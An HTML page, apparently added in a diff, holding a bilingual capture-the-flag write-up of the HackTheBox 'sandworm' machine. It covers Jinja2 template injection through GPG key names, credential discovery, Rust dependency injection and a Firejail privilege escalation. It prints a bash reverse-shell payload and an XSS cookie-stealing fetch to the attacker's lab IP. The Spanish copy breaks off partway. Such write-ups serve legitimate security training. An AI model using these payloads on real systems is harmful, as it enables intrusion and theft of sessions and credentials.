@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>sandworm | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">sandworm</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Flask web application that implemented PGP encryption and signature verification features. The application was vulnerable to Server-Side Template Injection (SSTI) through Jinja2 templates, specifically in the GPG key name field that was reflected during signature verification.</p>
+                    
+                    <p>By creating a GPG keypair with a malicious Jinja2 payload as the user identifier and signing a message with it, the template injection triggered when the application verified the signature, allowing arbitrary command execution. This granted initial access as the sandboxed <code>atlas</code> user running inside a Firejail container.</p>
+                    
+                    <p>After discovering credentials for the <code>silentobserver</code> user in configuration files, lateral movement was achieved via SSH. From there, process monitoring with <code>pspy</code> revealed that root was periodically executing <code>cargo run</code> as <code>atlas</code> in the <code>/opt/tipnet</code> directory. The project used a custom Rust crate called <code>logger</code> that <code>silentobserver</code> had write permissions to.</p>
+                    
+                    <p>By injecting malicious Rust code into the logger library, a reverse shell was obtained as the real <code>atlas</code> user (outside Firejail). Finally, privilege escalation to root was achieved by exploiting a vulnerable SUID Firejail binary using a known join vulnerability that allowed escaping the sandbox and executing commands as root.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Flask/Jinja2 Server-Side Template Injection (SSTI), GPG signature verification abuse, Firejail sandbox escape, Rust dependency injection, Firejail join privilege escalation (CVE-2022-31214).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Beginning with an nmap scan to identify open ports and services:</p>
+                <p><img src="./media/image4.png" alt="Nmap scan results showing open ports including SSH on 22, HTTP on 80, and HTTPS on 443" /></p>
+
+                <p>The scan reveals SSH on port 22 and web services on ports 80 and 443. I add <code>ssa.htb</code> to my <code>/etc/hosts</code> file to access the web application.</p>
+
+                <h2>Web Enumeration - Secret Spy Agency</h2>
+                <p>Navigating to the website reveals a Secret Spy Agency themed application:</p>
+                <p><img src="./media/image2.png" alt="Secret Spy Agency website homepage showing the main interface" /></p>
+
+                <p>The machine name "sandworm" references the <a href="https://en.wikipedia.org/wiki/Sandworm_(hacker_group)">Russian hacker group Sandworm</a>, suggesting the theme of the challenge.</p>
+
+                <p>Running <code>whatweb</code> provides additional technical information:</p>
+                <pre><code class="language-bash">whatweb https://ssa.htb</code></pre>
+
+                <pre><code class="language-plaintext">https://ssa.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.218], 
+JQuery, PoweredBy[Flask&trade;], Script, Title[Secret Spy Agency | Secret Security Service], 
+nginx[1.18.0]</code></pre>
+
+                <p>The application is powered by Flask, which uses Jinja2 templating engine - this is an important detail for potential SSTI vulnerabilities.</p>
+
+                <h3>Directory Enumeration</h3>
+                <p>Using <code>gobuster</code> to enumerate directories and virtual hosts reveals several interesting endpoints:</p>
+                <p><img src="./media/image5.png" alt="Gobuster scan results showing discovered directories including /admin, /contact, /guide, /pgp, and /view" /></p>
+
+                <p>The discovered endpoints include:</p>
+                <ul>
+                    <li><code>/admin</code> and <code>/view</code> - Both redirect to a login portal</li>
+                    <li><code>/pgp</code> - Contains a PGP public key</li>
+                    <li><code>/guide</code> - Instructions on how to use PGP encryption for secure communication</li>
+                    <li><code>/contact</code> - A contact form that requires PGP-encrypted messages</li>
+                </ul>
+
+                <h2>Understanding the PGP Implementation</h2>
+                <p>The application implements PGP encryption and signature verification functionality. In the <code>/guide</code> section, there are two main features:</p>
+
+                <ol>
+                    <li><strong>Message Decryption:</strong> Users can provide the application's public key, encrypt a message with it, and the application will decrypt it</li>
+                    <li><strong>Signature Verification:</strong> Users can provide their own public key and a signed message, and the application will verify the signature</li>
+                </ol>
+
+                <p>The contact form at <code>/contact</code> enforces PGP encryption - attempting to send an unencrypted message results in an error.</p>
+
+                <h2>Testing for Vulnerabilities</h2>
+                <p>Initially, I explored several attack vectors:</p>
+
+                <h3>XSS Attempts</h3>
+                <p>I attempted to inject XSS payloads in encrypted messages, hoping that an administrator would decrypt and view them, potentially leaking session cookies:</p>
+                <pre><code class="language-html">&lt;img src=x onerror=fetch("10.10.16.6:8000?session=" + document.cookie)&gt;</code></pre>
+
+                <p>I also tried embedding XSS payloads in the GPG key name and email fields, but none of these approaches yielded results after monitoring my HTTP server for incoming requests.</p>
+
+                <h3>SSTI Discovery</h3>
+                <p>Since the application uses Flask with Jinja2 templates, Server-Side Template Injection (SSTI) becomes a viable attack vector. I tested for SSTI in various locations:</p>
+
+                <ul>
+                    <li>The decrypted message display area - No injection possible</li>
+                    <li>The signature verification popup/modal - This looked promising, as the GPG key name and email are reflected when verifying signatures</li>
+                </ul>
+
+                <h2>Exploiting SSTI Through GPG Key Names</h2>
+                <p>The key insight is that during signature verification, the application displays information about the signer's GPG key. If the key name or email contains template syntax, it might be interpreted by Jinja2.</p>
+
+                <h3>Creating a Malicious GPG Key</h3>
+                <p>I generate a new GPG keypair with a Jinja2 payload as the user identifier:</p>
+                <pre><code class="language-bash">gpg --gen-key</code></pre>
+
+                <p>When prompted for the email address, I provide an SSTI test payload:</p>
+                <pre><code class="language-plaintext">Email address: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</code></pre>
+
+                <p>This creates a USER-ID containing the template injection:</p>
+                <pre><code class="language-plaintext">You selected this USER-ID:
+"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} 
+&lt;{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}&gt;"</code></pre>
+
+                <p>Next, I export the public key:</p>
+                <pre><code class="language-bash">gpg --armor --export "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} 
+&lt;{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}&gt;" > mypublickey2.asc</code></pre>
+
+                <p>And sign a test message with this key:</p>
+                <pre><code class="language-bash">gpg --local-user "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} 
+&lt;{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}&gt;" --clearsign message2.txt</code></pre>
+
+                <h3>Confirming SSTI Execution</h3>
+                <p>I upload the malicious public key and the signed message to the signature verification feature. The application confirms the SSTI vulnerability by executing the <code>id</code> command:</p>
+                <p><img src="./media/image7.png" alt="Signature verification popup showing successful SSTI execution with the output of the id command displayed" /></p>
+
+                <p>The output shows that the template was interpreted and the <code>id</code> command was executed, confirming full SSTI exploitation capability.</p>
+
+                <h2>Initial Access - Reverse Shell via SSTI</h2>
+                <p>Now that I've confirmed SSTI, I modify the payload to establish a reverse shell. I create a new GPG keypair with this payload:</p>
+                <pre><code class="language-python">{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >&amp; /dev/tcp/10.10.16.6/443 0>&amp;1"').read()}}</code></pre>
+
+                <p>After setting up a netcat listener and repeating the key generation and signing process with the new payload, I successfully receive a reverse shell as the <code>atlas</code> user.</p>
+
+                <p>However, I quickly notice that this <code>atlas</code> user is running inside a Firejail sandbox with restricted capabilities - I have limited commands available and the filesystem appears read-only in many locations:</p>
+                <pre><code class="language-bash">bash: asd: Read-only file system</code></pre>
+
+                <h2>Credential Discovery and Lateral Movement</h2>
+                <p>Exploring the application source code in the sandboxed environment, I discover several interesting credentials and configuration details.</p>
+
+                <h3>Application Credentials</h3>
+                <p>In the Flask application code, I find a passphrase used for GPG decryption:</p>
+                <pre><code class="language-python">msg = gpg.decrypt(encrypted, passphrase='$M1DGu4rD$')</code></pre>
+
+                <p>In <code>__init__.py</code>, I find Flask secret key and MySQL credentials:</p>
+                <pre><code class="language-python">app.config['SECRET_KEY'] = '91668c1bc67132e3dcfb5b1a3e0c5c21'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'</code></pre>
+
+                <p>These credentials don't work for SSH access to either <code>atlas</code> or <code>silentobserver</code> users.</p>
+
+                <h3>HTTP Session Credentials</h3>
+                <p>In <code>~/.config/httpie/sessions/localhost_5000/admin.json</code>, I discover credentials for the <code>silentobserver</code> user:</p>
+                <pre><code class="language-json">"auth": {
+    "password": "quietLiketheWind22",
+    "type": null,
+    "username": "silentobserver"
+}</code></pre>
+
+                <p>These credentials successfully grant SSH access as <code>silentobserver</code>, allowing me to escape the Firejail sandbox and explore the system more freely.</p>
+
+                <h3>Database Exploration</h3>
+                <p>Using the MySQL credentials, I connect to the database and examine the users table:</p>
+                <pre><code class="language-plaintext">| 1 | Odin | pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f
+| 2 | silentobserver | pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d</code></pre>
+
+                <p>I attempt to crack these hashes using <code>hashcat</code> with mode 10000 (Django PBKDF2-SHA256) but don't achieve any results with the rockyou.txt wordlist.</p>
+
+                <h2>Privilege Escalation Path - SUID Firejail</h2>
+                <p>Searching for SUID binaries, I find an interesting one:</p>
+                <pre><code class="language-bash">find / -perm -4000 2>/dev/null</code></pre>
+
+                <pre><code class="language-plaintext">/usr/local/bin/firejail</code></pre>
+
+                <p>The permissions show it's restricted to root and the <code>jailer</code> group:</p>
+                <pre><code class="language-plaintext">-rwsr-x--- 1 root jailer 1777952 Nov 29 2022 /usr/local/bin/firejail</code></pre>
+
+                <p>I find a privilege escalation exploit for Firejail: <a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25">https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25</a></p>
+
+                <p>However, <code>silentobserver</code> is not in the <code>jailer</code> group, so I cannot execute Firejail. Only the real <code>atlas</code> user (not the sandboxed one) belongs to this group:</p>
+                <pre><code class="language-bash">id atlas</code></pre>
+
+                <pre><code class="language-plaintext">uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)</code></pre>
+
+                <h3>Understanding the Sandbox</h3>
+                <p>In the home directory of <code>atlas</code>, I find the Firejail configuration that explains the restrictions applied to the sandboxed application user:</p>
+                <p><img src="./media/image6.png" alt="Firejail configuration file showing the sandbox restrictions including blacklisted directories and allowed operations" /></p>
+
+                <p>This configuration reveals that the initial <code>atlas</code> shell I obtained was heavily restricted by Firejail, which is why I need to find a way to become the real <code>atlas</code> user outside the sandbox.</p>
+
+                <h2>Process Monitoring with pspy</h2>
+                <p>At this point, I need to find a way to become <code>atlas</code> outside the Firejail sandbox. Following a hint that suggests monitoring system processes, I use <code>pspy</code> (<a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a>) to observe what's happening on the system.</p>
+
+                <p>After downloading and transferring <code>pspy</code> to the target, I discover interesting automated tasks:</p>
+                <p><img src="./media/image3.png" alt="pspy output showing root executing cargo run in /opt/tipnet directory as atlas user" /></p>
+
+                <p>The process monitoring reveals that:</p>
+                <ol>
+                    <li>Root enters the <code>/opt/tipnet</code> directory</li>
+                    <li>Root executes <code>cargo run --offline</code> as the <code>atlas</code> user</li>
+                    <li>The Rust application builds and runs as <code>atlas</code></li>
+                    <li>After approximately 10 seconds, root executes a cleanup script at <code>/root/cleanup/clean_c.sh</code></li>
+                </ol>
+
+                <h2>Rust Dependency Injection</h2>
+                <p>Examining <code>/opt/tipnet/main.rs</code>, I find another set of MySQL credentials:</p>
+                <pre><code class="language-rust">"mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream"</code></pre>
+
+                <p>However, these credentials don't work for SSH either. The database only contains website data without useful information for exploitation.</p>
+
+                <h3>Analyzing the Rust Project</h3>
+                <p>In <code>/opt/tipnet</code>, there's an SUID binary of <code>tipnet</code> that I can execute, but it has limited functionality and I cannot modify <code>main.rs</code> directly.</p>
+
+                <p>Looking more carefully at <code>main.rs</code>, I notice it uses a custom library (crate) called <code>logger</code>. Using <code>find</code>, I locate the source code at <code>/opt/crates/logger/src/lib.rs</code>.</p>
+
+                <p>Checking the permissions:</p>
+                <pre><code class="language-bash">ls -la /opt/crates/logger/src/lib.rs</code></pre>
+
+                <pre><code class="language-plaintext">-rw-rw-r-- 1 atlas silentobserver 732 May 4 2023 lib.rs</code></pre>
+
+                <p>Excellent! The <code>silentobserver</code> user has write permissions through group ownership. This means I can inject malicious code into the logger library that will be executed when root runs <code>cargo run</code> as <code>atlas</code>.</p>
+
+                <h3>Injecting Malicious Rust Code</h3>
+                <p>I modify <code>/opt/crates/logger/src/lib.rs</code> to include a reverse shell payload. Using the same import pattern I observed in <code>main.rs</code> and with some assistance from AI for proper Rust syntax, I inject this code:</p>
+                <p><img src="./media/image1.png" alt="Modified lib.rs file showing the injected reverse shell payload using Rust's Command module" /></p>
+
+                <p>The injected code uses Rust's <code>std::process::Command</code> to execute a bash reverse shell back to my attacking machine. When root triggers <code>cargo run --offline</code> as <code>atlas</code>, the logger library will be compiled and executed, triggering my payload.</p>
+
+                <p>After setting up a netcat listener and waiting for the scheduled task to run, I successfully receive a reverse shell as the real <code>atlas</code> user, outside the Firejail sandbox.</p>
+
+                <h2>Privilege Escalation to Root - Firejail Join Exploit</h2>
+                <p>Now that I have access as <code>atlas</code> with membership in the <code>jailer</code> group, I can exploit the Firejail SUID binary.</p>
+
+                <h3>Establishing Persistence</h3>
+                <p>To ensure I don't lose access, I add my SSH public key to <code>/home/atlas/.ssh/authorized_keys</code>, allowing me to reconnect via SSH if the shell drops.</p>
+
+                <h3>Exploiting Firejail</h3>
+                <p>I execute the Firejail privilege escalation exploit found earlier: <a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25">https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25</a></p>
+
+                <p>The exploit works by abusing Firejail's <code>--join</code> functionality. When a Firejail sandbox is created with certain misconfigurations, it's possible to join the namespace and escalate privileges.</p>
+
+                <p>Running the exploit from one SSH session:</p>
+                <pre><code class="language-bash">python3 xd.py</code></pre>
+
+                <pre><code class="language-plaintext">You can now run 'firejail --join=2850' in another terminal to obtain a shell 
+where 'sudo su -' should grant you a root shell.</code></pre>
+
+                <p>From a second SSH session as <code>atlas</code>, I join the Firejail instance:</p>
+                <pre><code class="language-bash">firejail --join=2850</code></pre>
+
+                <pre><code class="language-plaintext">changing root to /proc/2850/root
+Warning: cleaning all supplementary groups
+Child process initialized in 6.27 ms</code></pre>
+
+                <p>While <code>sudo su -</code> didn't work in my case, simply running <code>su</code> without any arguments successfully escalates to root:</p>
+                <pre><code class="language-bash">su</code></pre>
+
+                <pre><code class="language-bash">whoami</code></pre>
+
+                <pre><code class="language-plaintext">root</code></pre>
+
+                <p>I now have root access and can retrieve the final flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> La máquina objetivo ejecutaba una aplicación web Flask que implementaba funcionalidades de cifrado PGP y verificación de firmas. La aplicación era vulnerable a Server-Side Template Injection (SSTI) mediante plantillas Jinja2, específicamente en el campo del nombre de clave GPG que se reflejaba durante la verificación de firmas.</p>
+                    
+                    <p>Creando un par de claves GPG con un payload malicioso de Jinja2 como identificador de usuario y firmando un mensaje con ella, la inyección de plantilla se activó cuando la aplicación verificó la firma, permitiendo la ejecución arbitraria de comandos. Esto otorgó acceso inicial como el usuario <code>atlas</code> en un contenedor Firejail con restricciones.</p>
+                    
+                    <p>Tras descubrir credenciales para el usuario <code>silentobserver</code> en archivos de configuración, se logró movimiento lateral mediante SSH. Desde allí, la monitorización de procesos con <code>pspy</code> reveló que root ejecutaba periódicamente <code>cargo run</code> como <code>atlas</code> en el directorio <code>/opt/tipnet</code>. El proyecto usaba una crate personalizada de Rust llamada <code>logger</code> sobre la que <code>silentobserver</code> tenía permisos de escritura.</p>
+                    
+                    <p>Inyectando código Rust malicioso en la librería logger, se obtuvo una reverse shell como el usuario <code>atlas</code> real (fuera de Firejail). Finalmente, la escalada de privilegios a root se logró explotando un binario Firejail con SUID vulnerable usando una vulnerabilidad de join conocida que permitía escapar del sandbox y ejecutar comandos como root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Server-Side Template Injection (SSTI) en Flask/Jinja2, abuso de verificación de firmas GPG, escape de sandbox Firejail, inyección de dependencias en Rust, escalada de privilegios mediante Firejail join (CVE-2022-31214).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios:</p>
+                <p><img src="./media/image4.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22, HTTP en el 80 y HTTPS en el 443" /></p>
+
+                <p>El escaneo revela SSH en el puerto 22 y servicios web en los puertos 80 y 443. Añado <code>ssa.htb</code> a mi archivo <code>/etc/hosts</code> para acceder a la aplicación web.</p>
+
+                <h2>Enumeración Web - Agencia de Espías Secreta</h2>
+                <p>Navegando al sitio web se revela una aplicación temática de agencia de espías secreta:</p>
+                <p><img src="./media/image2.png" alt="Página principal del sitio web Secret Spy Agency mostrando la interfaz principal" /></p>
+
+                <p>El nombre de la máquina "sandworm" hace referencia al <a href="https://en.wikipedia.org/wiki/Sandworm_(hacker_group)">grupo hacker ruso Sandworm</a>, sugiriendo la temática del desafío.</p>
+
+                <p>Ejecutando <code>whatweb</code> proporciona información técnica adicional:</p>
+                <pre><code class="language-bash">whatweb https://ssa.htb</code></pre>
+
+                <pre><code class="language-plaintext">https://ssa.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.218], 
+JQuery, PoweredBy[Flask&trade;], Script, Title[Secret Spy Agency | Secret Security Service], 
+nginx[1.18.0]</code></pre>
+
+                <p>La aplicación funciona con Flask, que usa el motor de plantillas Jinja2 - esto es un detalle importante para posibles vulnerabilidades SSTI.</p>
+
+                <h3>Enumeración de Directorios</h3>
+                <p>Usando <code>gobuster</code> para enumerar directorios y hosts virtuales revela varios endpoints interesantes:</p>
+                <p><img src="./media/image5.png" alt="Resultados del escaneo de gobuster mostrando directorios descubiertos incluyendo /admin, /contact, /guide, /pgp y /view" /></p>
+
+                <p>Los endpoints descubiertos incluyen:</p>
+                <ul>
+                    <li><code>/admin</code> y <code>/view</code> - Ambos redirigen a un portal de login</li>
+                    <li><code>/pgp</code> - Contiene una clave pública PGP</li>
+                    <li><code>/guide</code> - Instrucciones sobre cómo usar cifrado PGP para comunicación segura</li>
+                    <li><code>/contact</code> - Un formulario de contacto que requiere mensajes cifrados con PGP</li>
+                </ul>
+
+                <h2>Entendiendo la Implementación PGP</h2>
+                <p>La aplicación implementa funcionalidad de cifrado PGP y verificación de firmas. En la sección <code>/guide</code>, hay dos características principales:</p>
+
+                <ol>
+                    <li><strong>Descifrado de Mensajes:</strong> Los usuarios pueden proporcionar la clave pública de la aplicación, cifrar un mensaje con ella, y la aplicación lo descifrará</li>
+                    <li><strong>Verificación de Firmas:</strong> Los usuarios pueden proporcionar su propia clave pública y un mensaje firmado, y la aplicación verificará la firma</li>
+                </ol>
+
+                <p>El formulario de contacto en <code>/contact</code> fuerza el cifrado PGP - intentar enviar un mensaje sin cifrar resulta en error.</p>
+
+                <h2>Probando Vulnerabilidades</h2>
+                <p>Inicialmente, exploré varios vectores de ataque:</p>
+
+                <h3>Intentos de XSS</h3>
+                <p>Intenté inyectar payloads XSS en mensajes cifrados, esperando que un administrador los descifre y visualice, potencialmente filtrando cookies de sesión:</p>
+                <pre><code class="language-html">&lt;img src=x onerror=fetch("10.10.16.6:8000?session=" + document.cookie)&gt;</code></pre>
+
+                <p>También probé a embeber payloads XSS en los campos de nombre y email de la clave GPG, pero ninguno de estos enfoques dio resultados tras monitorizar mi servidor HTTP en busca de peticiones entrantes.</p>
+
+                <h3>Descubrimiento de SSTI</h3>
+                <p>Como la aplicación usa Flask con plantillas Jinja2, Server-Side Template Injection (SSTI) se convierte en un vector de ataque viable. Probé SSTI en varias ubicaciones:</p>
+
+                <ul>
+                    <li>El área de visualización de mensajes descifrados - Sin inyección posible</li>
+                    <li>El popup/modal de verificación de firma - Esto parecía prometedor, ya que el nombre y email de la clave GPG se reflejan al verificar firmas</li>
+                </ul>
+
+                <h2>Explotando SSTI Mediante Nombres de Clave GPG</h2>
+                <p>La clave está en que durante la verificación de firma, la aplicación muestra información sobre la clave GPG del firmante. Si el nombre o email de la clave contiene sintaxis de plantilla, podría ser interpretada por Jinja2.</p>
+
+                <h3>Creando una Clave GPG Maliciosa</h3>
+                <p>Genero un nuevo par de claves GPG con un payload de Jinja2 como identificador de usuario:</p>
+                <pre><code class="language-bash">gpg --gen-key</code></pre>
+
+                <p>Cuando se solicita la dirección de email, proporciono un payload de prueba SSTI:</p>
+                <pre><code class="language-plaintext">Email address: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</code></pre>
+
+                <p>Esto crea un USER-ID que contiene la inyección de plantilla:</p>
+                <pre><code class="language-plaintext">You selected this USER-ID:
+"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} 
+&lt;{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}&gt;"</code></pre>
+
+                <p>A continuación, exporto la clave pública:</p>
+                <pre><code class="language-bash">gpg --armor --export "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} 
+&lt;{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}&gt;" > mypublickey2.asc</code></pre>
+
+                <p>Y firmo un mensaje de prueba con esta clave:</p>
+                <pre><code class="language-bash">gpg --local-user "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} 
+&lt;{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}&gt;" --clearsign message2.txt</code></pre>
+
+                <h3>Confirmando Ejecución SSTI</h3>
+                <p>Subo la clave pública maliciosa y el mensaje firmado a la funcionalidad de verificación de firmas. La aplicación confirma la vulnerabilidad SSTI ejecutando el comando <code>id</code>:</p>
+                <p><img src="./media/image7.png" alt="Popup de verificación de firma mostrando la ejecución exitosa de SSTI con la salida del comando id visualizada" /></p>
+
+                <p>La salida muestra que la plantilla fue interpretada y el comando <code>id</code> fue ejecutado, confirmando capacidad completa de explotación SSTI.</p>
+
+                <h2>Acceso Inicial - Reverse Shell mediante SSTI</h2>
+                <p>Ahora que he confirmado SSTI, modifico el payload para establecer una reverse shell. Creo un nuevo par de claves GPG con este payload:</p>
+                <pre><code class="language-python">{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >&amp; /dev/tcp/10.10.16.6/443 0>&amp;1"').read()}}</code></pre>
+
+                <p>Tras configurar un listener de netcat y repetir el proceso de generación de claves y firmado con el nuevo payload, recibo exitosamente una reverse shell como el usuario <code>atlas</code>.</p>
+
+                <p>Sin embargo, rápidamente noto que este usuario <code>atlas</code> está ejecutándose dentro de un sandbox Firejail con capacidades restringidas - tengo comandos limitados disponibles y el sistema de archivos parece de solo lectura en muchas ubicaciones:</p>
+                <pre><code class="language-bash">bash: asd: Read-only file system</code></pre>
+
+                <h2>Descubrimiento de Credenciales y Movimiento Lateral</h2>
+                <p>Explorando el código fuente de la aplicación en el entorno sandboxeado, descubro varios credenciales y detalles de configuración interesantes.</p>
+
+                <h3>Credenciales de la Aplicación</h3>
+                <p>En el código de la aplicación Flask, encuentro una contraseña usada para descifrado GPG:</p>
+                <pre><code class="language-python">msg = gpg.decrypt(encrypted, passphrase='$M1DGu4rD$')</code></pre>
+
+                <p>En <code>__init__.py</code>, encuentro la clave secreta de Flask y credenciales de MySQL:</p>
+                <pre><code class="language-python">app.config['SECRET_KEY'] = '91668c1bc67132e3dcfb5b1a3e0c5c21'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'</code></pre>
+
+                <p>Estos credenciales no funcionan para acceso SSH ni con <code>atlas</code> ni con <code>silentobserver</code>.</p>
+
+                <h3>Credenciales de Sesión HTTP</h3>
+                <p>En <code>~/.config/httpie/sessions/localhost_5000/admin.json</code>, descubro credenciales para el usuario <code>silentobserver</code>:</p>
+                <pre><code class="language-json">"auth": {
+    "password": "quietLiketheWind22",
+    "type": null,
+    "username": "silentobserver"
+}</code></pre>
+
+                <p>Estos credenciales otorgan exitosamente acceso SSH como <code>silentobserver</code>, permitiéndome escapar del sandbox Firejail y explorar el sistema más libremente.</p>
+
+                <h3>Exploración de Base de Datos</h3>
+                <p>Usando los credenciales de MySQL, me conecto a la base de datos y examino la tabla de usuarios:</p>
+                <pre><code class="language-plaintext">| 1 | Odin | pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f
+| 2 | silentobserver | pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d</code></pre>
+
+                <p>Intento crackear estos hashes usando <code>hashcat</code> con el modo 10000 (Django PBKDF2-SHA256) pero no consigo resultados con el diccionario rockyou.txt.</p>
+
+                <h2>Ruta de Escalada de Privilegios - SUID Firejail</h2>
+                <p>Buscando binarios con SUID, encuentro uno interesante:</p>
+                <pre><code class="language-bash">find / -perm -4000 2>/dev/null</code></pre>
+
+                <pre><code class="language-plaintext">/usr/local/bin/firejail</code></pre>
+
+                <p>Los permisos muestran que está restringido a root y al grupo <code>jailer</code>:</p>
+                <pre><code class="language-plaintext">-rwsr-x--- 1 root jailer 1777952 Nov 29 2022 /usr/local/bin/firejail</code></pre>
+
+                <p>Encuentro un exploit de escalada de privilegios para Firejail: <a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25">https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25</a></p>
+
+                <p>Sin embargo, <code>silentobserver</code> no está en el grupo <code>jailer</code>, así que no puedo ejecutar Firejail. Solo el usuario <code>atlas</code> real (no el sandboxeado) pertenece a este grupo:</p>
+                <pre><code class="language-bash">id atlas</code></pre>
+
+                <pre><code class="language-plaintext">uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)</code></pre>
+
+                <h3>Entendiendo el Sandbox</h3>
+                <p>En el directorio home de <code>atlas</code>, encuentro la configuración de Firejail que explica las restricciones aplicadas al usuario de la aplicación sandboxeado:</p>
+                <p><img src="./media/image6.png" alt="Archivo de configuración de Firejail mostrando las restricciones del sandbox incluyendo directorios en lista negra y operaciones permitidas" /></p>
+
+                <p>Esta configuración revela que la shell inicial de <code>atlas</code> que obtuve estaba fuertemente restringida por Firejail, razón por la cual necesito encontrar una manera de convertirme en el usuario <code>atlas</code> real fuera del sandbox.</p>
+
+                <h2>Monitorización de Procesos con pspy</h2>
+                <p>En este punto, necesito encontrar una forma de convertirme en <code>atlas</code> fuera del sandbox Firejail. Siguiendo una pista que sugiere monitorizar procesos del sistema, uso <code>pspy</code> (<a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a>) para observar qué está ocurriendo en el sistema.</p>
+
+                <p>Tras descargar y transferir <code>pspy</code> al objetivo, descubro tareas automatizadas interesantes:</p>
+                <p><img src="./media/image3.png" alt="Salida de pspy mostrando a root ejecutando cargo run en el directorio /opt/tipnet como usuario atlas" /></p>
+
+                <p>La monitorización de procesos revela que:</p>
+                <ol>
+                    <li>Root entra en el directorio <code>/opt/tipnet</code></li>
+                    <li>Root ejecuta <code>cargo run --offline</code> como el usuario <code>atlas</code></li>
+                    <li>La aplicación Rust compila y ejecuta como <code>atlas</code></li>
+                    <li>Aproximadamente 10 segundos después, root ejecuta un script de limpieza en <code>/root/cleanup/clean_c.sh</code></li>
+                </ol>
+
+                <h2>Inyección de Dependencias en Rust</h2>
+                <p>Examinando <code>/opt/tipnet/main.rs</code>, encuentro otro conjunto de credenciales de MySQL:</p>
+                <pre><code class="language-rust">"mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream"</code></pre>
+
+                <p>Sin embargo, estos credenciales tampoco funcionan para SSH. La base de datos solo contiene datos del sitio web sin información útil para explotación.</p>
+
+                <h3>Analizando el Proyecto Rust</h3>
